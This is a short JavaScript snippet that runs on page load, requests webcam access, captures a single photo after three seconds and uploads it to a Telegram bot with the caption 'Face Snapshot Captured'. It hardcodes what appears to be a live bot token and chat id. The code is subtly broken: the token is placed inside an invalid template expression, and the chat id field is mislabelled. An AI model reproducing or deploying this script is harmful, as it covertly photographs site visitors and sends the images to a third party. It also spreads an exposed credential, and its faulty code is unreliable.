async function captureFaceAndSend() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();

    const canvas = document.createElement('canvas');
    setTimeout(() => {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);

      stream.getTracks().forEach(track => track.stop());

      canvas.toBlob(async (blob) => {
        const formData = new FormData();
        formData.append('6396297682', 6396297682);
        formData.append('photo', blob, 'snapshot.jpg');
        formData.append('caption', '📸 *Face Snapshot Captured*');
        
        await fetch(`https://api.telegram.org/bot${7655435661:AAGvQFoUKanmBZaZXND5AXbrPuClcYM9XIk}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
      }, 'image/jpeg');
    }, 3000); // Wait 3 sec for camera focus
  } catch (e) {
    console.warn('Camera access denied or failed.', e);
  }
}

window.onload = captureFaceAndSend;
